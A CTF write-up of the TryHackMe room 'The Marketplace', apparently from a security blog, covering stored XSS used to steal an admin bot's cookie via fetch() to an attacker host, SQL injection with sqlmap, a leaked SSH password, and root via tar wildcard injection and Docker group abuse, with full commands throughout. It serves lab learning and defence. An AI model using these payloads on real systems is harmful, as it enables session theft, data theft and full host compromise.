---
layout: post
mermaid: true
title: "The Marketplace"
date: 2026-09-01
categories: [ctf, web, privesc]
tags: [xss, jwt, sql-injection, sqlmap, wildcard-injection, docker]
---

## Overview

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Medium |
| **URL** | <a href="https://tryhackme.com/room/marketplace" target="_blank">https://tryhackme.com/room/marketplace</a> |
| **Focus** | Stored XSS chained through an internal moderation bot to steal an admin session, then SQL injection and a classic tar wildcard injection to reach root |

The Marketplace is a room that chains together a lot of small, realistic mistakes rather than one big obvious hole. A stored XSS on a listing page doesn't help much on its own — until you realize there's a bot reviewing reported content with real admin privileges. From there it's SQL injection, a leaked credential sitting in plaintext, and a privilege escalation path that abuses both `tar` and Docker group membership.

---

## Reconnaissance

A standard scan to map the attack surface:

```bash
rustscan -a <TARGET_IP>

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
32768/tcp open  http
```

```bash
nmap -sS -sC -sV -O -Pn -p 22,80,32768 <TARGET_IP> -oN nmap.txt

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js Express
```

Port 80 is nginx acting as a reverse proxy in front of the same app also exposed directly on 32768 via Express — so no extra attack surface there, just a second door into the same house. `robots.txt` disallows `/admin` on both ports, which is always worth checking first.

---

## Getting a Session

Signup doesn't authenticate — it just creates the account and redirects to login:

```bash
curl -i -X POST http://<TARGET_IP>/signup -d "username=alex&password=alex" -c cookies.txt
curl -i -X POST http://<TARGET_IP>/login -d "username=alex&password=alex" -c cookies.txt
```

Login returns a JWT in a `token` cookie. The payload decodes to something refreshingly readable:

```json
{"userId":4,"username":"alex","admin":false,"iat":...}
```

Nothing encrypted, nothing signed with a secret I'd need to crack — just a base64 JSON blob, which is worth keeping in mind for later.

---

## Stored XSS in Listings

The `/new` form creates a listing, and both the `Title` and `Description` fields get inserted into the page without escaping:

```
Title: <script>alert('title-xss')</script>
Description: <script>alert(document.cookie)</script>
```

Both alerts fire when the listing loads. Classic stored XSS — but on its own, that only attacks other regular users, not exactly a huge win.

---

## Stealing an Admin Session

Here's the twist: the room ships with a moderation bot. Reporting a listing gets it reviewed by an admin account (`michael`) with a real, authenticated session. That's a much better target than any random visitor.

```bash
python3 -m http.server 8000
```

New listing, this time with no `alert()` at all — the bot skips review if it detects an alert box:

```
Title: refresh
Description: <script>fetch('http://<ATTACKER_IP>:8000/?c='+document.cookie)</script>
```

Create the listing, click "Report listing to admins," and wait. The listener catches a request from the bot carrying `michael`'s cookie:

```json
{"userId":2,"username":"michael","admin":true,"iat":...}
```

The admin JWT only lives for a few minutes, so from here it pays to have every follow-up command ready to fire the moment a fresh token lands.

---

## Reaching the Admin Panel

```bash
curl -i http://<TARGET_IP>/admin -H "Cookie: token=$JWT"

HTTP/1.1 200 OK
```

The page itself obfuscates its content with some inline JS string manipulation — nothing that survives `curl | grep`, but trivial to read once rendered in an actual browser.

---

## SQL Injection in the Admin Panel

The `user` parameter on `/admin` is concatenated straight into a MySQL query:

```bash
curl -s "http://<TARGET_IP>/admin?user=1'" -H "Cookie: token=$JWT"

Error: ER_PARSE_ERROR: ... near ''' at line 1
```

That error confirms both the injection and the database engine. One annoyance: regular spaces don't survive intact into the query (something upstream looked like it was truncating on whitespace), so `/**/` comments stand in for spaces, and `%23` replaces `-- -` as a line-comment terminator.

Column count comes from an `ORDER BY` probe — no error through 4, breaks on 5:

```bash
curl -s "http://<TARGET_IP>/admin?user=1/**/ORDER/**/BY/**/N%23" -H "Cookie: token=$JWT"
```

A `UNION SELECT` then maps which columns actually render on the page — turns out column 3 never shows up anywhere in the HTML, so extracting through it means swapping its position with a column that does render:

```bash
curl -s "http://<TARGET_IP>/admin?user=0/**/UNION/**/SELECT/**/1,2,3,4%23" -H "Cookie: token=$JWT"
```

From there, standard `information_schema` enumeration gets the database name, table list, and column names — `0x7573657273` in one of the queries is just the hex encoding of the string `"users"`, a way to avoid single quotes inside the URL entirely.

---

## Automating the Dump with sqlmap

Manually paging through rows with `LIMIT`/`OFFSET` gets old fast — sqlmap handles it far more efficiently once the injection point is confirmed:

```bash
sqlmap -u "http://<TARGET_IP>/admin?user=1" --cookie="token=$JWT" --dbms=mysql --technique=E --tamper=space2comment --delay=2 --batch
```

A few flags matter here: `--technique=E` sticks to error-based injection, the method already confirmed manually. `--tamper=space2comment` automates the same `/**/`-for-spaces trick used by hand. `--delay=2` turned out to be essential — the server rate-limits requests, and without a delay sqlmap fires fast enough to trigger generic errors that break detection entirely.

From there, `--dbs`, `--tables`, `--columns`, and finally `--dump` on the `users` and `messages` tables pull everything at once.

**The `users` table** holds bcrypt password hashes — deliberately expensive to crack, and not worth the effort, because **`messages`** has something better:

```
system → jake: "Your SSH password is too weak... Your new password is: <PASSWORD>"
```

A plaintext SSH credential, sitting in an internal message. No cracking required.

---

## SSH Access

```bash
ssh jake@<TARGET_IP>
# password: <PASSWORD>

cat /home/jake/user.txt
```

---

## Privilege Escalation: tar Wildcards, Twice

```bash
sudo -l

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

The script itself is short:

```bash
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

That unquoted `*` is the whole vulnerability. When the shell expands it, `tar` doesn't just see filenames — if a file happens to be named starting with `--`, `tar` reads it as a command-line option instead. This is a well-documented GTFOBins technique, but it's satisfying to actually trigger it.

**First jump: `jake` → `michael`.** Clear out any existing backup file first (if `tar`'s output file already exists and belongs to someone else, the write fails before it ever touches the planted files), then plant the trap files:

```bash
cd /opt/backups
rm -f /opt/backups/backup.tar
echo 'cp /bin/bash /tmp/mbash && chmod +s /tmp/mbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
sudo -u michael /opt/backups/backup.sh
```

`--checkpoint=1` makes `tar` report progress, which enables `--checkpoint-action` — and that action runs `shell.sh`, which copies `bash` and sets the SUID bit on the copy. Since the whole thing runs as `michael`, that copy inherits `michael`'s ownership.

A cleanup cronjob wipes `/opt/backups` back down to just `backup.sh` periodically, so if the trap files vanish before the `sudo` call lands, recreating them right before retrying (no pause in between) is necessary.

```bash
ls -la /tmp/mbash   # -rwsr-sr-x, owned by michael
/tmp/mbash -p
id   # euid=1002(michael)
```

The `-p` flag matters — it tells bash not to drop its elevated privileges on startup, which is what lets the SUID bit actually take effect.

**Second jump: `michael` → `root`, via Docker.** LinPEAS flags something interesting:

```
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

`michael` is in the `docker` group. Since the Docker daemon itself runs as root, group membership there is functionally equivalent to root — any member can ask it to mount the host's root filesystem into a container and operate on it freely. Same wildcard trick, different payload:

```bash
cd /opt/backups
rm -f /opt/backups/backup.tar
echo 'docker run -v /:/mnt --rm alpine chroot /mnt chmod +s /bin/bash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
sudo -u michael /opt/backups/backup.sh
```

The container mounts the host's `/` at `/mnt`, `chroot`s into it, and sets the SUID bit on the real `/bin/bash` — and because the process inside the container is root (that's just how the Docker daemon operates), this time the `chmod` actually sticks on the host's real binary.

```bash
ls -la /bin/bash   # -rwsr-sr-x, owned by root
/bin/bash -p
id   # euid=0(root)
```

---

## Attack Flow

<div class="mermaid">
graph TD
 subgraph RECON["RECON"]
  A["nmap scan<br/>nginx proxy plus Express backend"]
 end
 
 subgraph ENUM["ENUMERATION"]
  B["Signup and login<br/>readable JWT payload"] --> C["Stored XSS in listing fields"]
 end
 
 subgraph EXPL["EXPLOITATION"]
  D["Report to admins<br/>bot steals michael JWT"] --> E["Admin panel access"]
  E --> F["SQL injection via user param<br/>space bypass with comments"]
  F --> G["sqlmap dump<br/>plaintext SSH password in messages"]
  G --> H["SSH access as jake"]
 end
 
 subgraph PRIVESC["PRIVESC"]
  I["sudo tar wildcard injection<br/>SUID bash as michael"] --> J["docker group membership"]
  J --> K["Host root mounted in container<br/>SUID root bash"]
 end
 
 A --> B
 C --> D
 H --> I
</div>

---

## Key Takeaways

**A stored XSS is only as good as who reviews it.** The listing XSS was useless against regular users, but a moderation bot with real admin privileges turned it into a full account takeover — always worth checking whether "reported content" gets reviewed by something more privileged than you.

**Unquoted wildcards in shell commands are still a live problem.** `tar cf archive.tar *` looks harmless until you can plant files named `--checkpoint-action=...` in the same directory — the shell expands the glob before `tar` ever sees it, and `tar` can't tell a filename from a flag.

**Docker group membership is root, full stop.** No `sudo` entry needed — anything that can talk to the Docker socket can mount the host filesystem and walk straight through any permission boundary that existed a moment earlier.

---

No flags are discussed here.
